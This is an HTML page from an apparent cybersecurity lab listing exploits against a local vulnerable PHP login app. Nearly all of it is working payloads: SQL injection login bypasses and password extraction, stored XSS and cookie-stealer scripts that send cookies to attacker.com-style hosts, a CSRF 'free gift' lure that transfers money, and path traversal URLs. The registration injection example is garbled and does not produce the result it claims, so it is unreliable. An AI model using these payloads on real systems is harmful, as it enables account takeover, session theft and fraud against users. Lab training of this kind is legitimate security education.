<!DOCTYPE html>
<html>
<head>
    <title>Vulnerability Exploits - Cybersecurity Lab</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
        .container { max-width: 900px; margin: 0 auto; }
        .exploit { margin-bottom: 40px; border: 1px solid #ddd; padding: 15px; }
        .exploit h2 { margin-top: 0; color: #d9534f; }
        pre { background-color: #f5f5f5; padding: 15px; overflow: auto; border-radius: 4px; }
        code { font-family: 'Courier New', monospace; }
        .button { 
            display: inline-block; 
            padding: 8px 15px; 
            background-color: #337ab7; 
            color: white; 
            text-decoration: none;
            border-radius: 4px;
        }
        .warning {
            color: #d9534f;
            font-weight: bold;
            border: 1px solid #d9534f;
            padding: 10px;
            margin-bottom: 20px;
            background-color: #f9f2f4;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Vulnerability Exploits - Cybersecurity Lab</h1>
        
        <div class="warning">
            EDUCATIONAL PURPOSE ONLY: These exploits are provided for educational purposes in a controlled environment. 
            Using these techniques against systems without explicit permission is illegal.
        </div>

        <div class="exploit">
            <h2>1. SQL Injection: Login Bypass</h2>
            <p>The login form is vulnerable to SQL injection, allowing attackers to bypass authentication.</p>
            
            <h3>Exploit:</h3>
            <pre><code>Email: admin@example.com' --
Password: anything</code></pre>
            
            <p>This exploit works by commenting out the password check in the SQL query.</p>
            
            <h3>Explanation:</h3>
            <pre><code>Original query: SELECT * FROM users WHERE email='$email' AND pass='$password'
Modified query: SELECT * FROM users WHERE email='admin@example.com' -- ' AND pass='anything'</code></pre>
            
            <p>Alternative login bypass:</p>
            <pre><code>Email: ' OR 1=1 --
Password: anything</code></pre>
        </div>

        <div class="exploit">
            <h2>2. SQL Injection: Data Extraction</h2>
            <p>The search feature in the dashboard allows SQL injection for data extraction.</p>
            
            <h3>Exploit:</h3>
            <pre><code>Search: ' UNION SELECT id, pass as email, 'exposed' as message FROM users --</code></pre>
            
            <p>This exploit extracts all usernames and passwords from the database.</p>
            
            <h3>Explanation:</h3>
            <pre><code>Original query: SELECT id, email, message FROM users WHERE email LIKE '%$search%'
Modified query: SELECT id, email, message FROM users WHERE email LIKE '%' UNION SELECT id, pass as email, 'exposed' as message FROM users --%'</code></pre>
        </div>

        <div class="exploit">
            <h2>3. Cross-Site Scripting (XSS): Stored XSS</h2>
            <p>The message field allows storing and executing malicious JavaScript.</p>
            
            <h3>Exploit:</h3>
            <pre><code>&lt;script&gt;
    var credentials = {
        email: document.cookie,
        url: window.location.href
    };
    
    fetch('https://attacker-controlled-site.com/steal.php', {
        method: 'POST',
        body: JSON.stringify(credentials)
    });
&lt;/script&gt;</code></pre>
            
            <h3>Simple proof test:</h3>
            <pre><code>&lt;script&gt;alert('XSS Vulnerability Confirmed!');&lt;/script&gt;</code></pre>
            
            <p>This can be placed in your profile message, which will execute whenever someone views your profile.</p>
        </div>

        <div class="exploit">
            <h2>4. Cross-Site Request Forgery (CSRF)</h2>
            <p>The money transfer feature has no CSRF protection, allowing attackers to trick users into transferring money.</p>
            
            <h3>Exploit (create this HTML file and trick a logged-in user to visit it):</h3>
            <pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;body&gt;
    &lt;h1&gt;Win a Prize!&lt;/h1&gt;
    &lt;p&gt;Click the button below to claim your free gift!&lt;/p&gt;
    
    &lt;!-- Hidden CSRF form --&gt;
    &lt;iframe style="display:none" name="csrf-frame"&gt;&lt;/iframe&gt;
    &lt;form id="csrf-form" action="http://localhost/login_app/dashboard.php" method="POST" target="csrf-frame"&gt;
        &lt;input type="hidden" name="to_id" value="2"&gt; &lt;!-- attacker's ID --&gt;
        &lt;input type="hidden" name="amount" value="1000"&gt;
        &lt;input type="hidden" name="transfer" value="Transfer Money"&gt;
    &lt;/form&gt;
    
    &lt;button onclick="document.getElementById('csrf-form').submit(); alert('Congratulations! Your gift is on the way!');"&gt;
        Claim Your Gift!
    &lt;/button&gt;
    
&lt;/body&gt;
&lt;/html&gt;</code></pre>
        </div>

        <div class="exploit">
            <h2>5. Path Traversal in Backup Feature</h2>
            <p>The backup feature allows specifying a custom path, enabling directory traversal attacks.</p>
            
            <h3>Exploit:</h3>
            <pre><code>http://localhost/login_app/reset.php?backup=1&path=../../../public_html/</code></pre>
            
            <p>This writes the database backup (including passwords) to a publicly accessible directory.</p>
            
            <h3>Alternative writing to system directories:</h3>
            <pre><code>http://localhost/login_app/reset.php?backup=1&path=../../../xampp/</code></pre>
        </div>

        <div class="exploit">
            <h2>6. Insecure Direct Object Reference (IDOR)</h2>
            <p>The user ID in money transfer is not properly validated, allowing unauthorized transfers.</p>
            
            <h3>Exploit:</h3>
            <p>Log in as any user and transfer money to/from arbitrary user IDs by simply changing the ID in the transfer form.</p>
        </div>

        <div class="exploit">
            <h2>7. SQL Injection in Registration</h2>
            <p>The registration feature is vulnerable to SQL injection.</p>
            
            <h3>Exploit:</h3>
            <pre><code>Email: newuser@test.com
Password: pass', money=9999999, message='Rich now
Message: anything</code></pre>
            
            <h3>Explanation:</h3>
            <pre><code>Original query: INSERT INTO users (email, pass, message, money) VALUES ('newuser@test.com', 'pass', 'anything', 100)
Modified query: INSERT INTO users (email, pass, message, money) VALUES ('newuser@test.com', 'pass', money=9999999, message='Rich now', 'anything', 100)</code></pre>
        </div>

        <div class="exploit">
            <h2>8. Session Hijacking (after XSS)</h2>
            <p>After a successful XSS attack, session cookies can be stolen.</p>
            
            <h3>Cookie Stealer Code:</h3>
            <pre><code>&lt;script&gt;
fetch('https://attacker.com/steal.php?cookie=' + encodeURIComponent(document.cookie));
&lt;/script&gt;</code></pre>
            
            <p>The attacker's server would have a file (steal.php) that logs these cookies, which can then be used to hijack sessions.</p>
        </div>

        <a href="index.php" class="button">Return to Application</a>
    </div>
</body>
</html>
